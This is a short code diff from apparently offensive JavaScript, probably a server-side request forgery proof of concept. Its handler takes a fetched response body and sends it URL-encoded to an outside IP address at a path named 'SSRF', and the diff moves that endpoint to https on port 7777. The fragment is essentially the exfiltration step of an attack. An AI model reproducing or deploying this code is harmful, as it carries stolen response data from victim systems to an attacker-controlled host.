@@ -14,7 +14,7 @@ function handler() {
       //do whatever you want
       var xhr2 = new XMLHttpRequest();
       xhr2.onreadystatechange = none; 
-      xhr2.open("GET", 'http://192.241.169.35/SSRF?u='+encodeURIComponent(this.responseText), true);
+      xhr2.open("GET", 'https://192.241.169.35:7777/SSRF?u='+encodeURIComponent(this.responseText), true);
       xhr2.send();
 }
   } else {
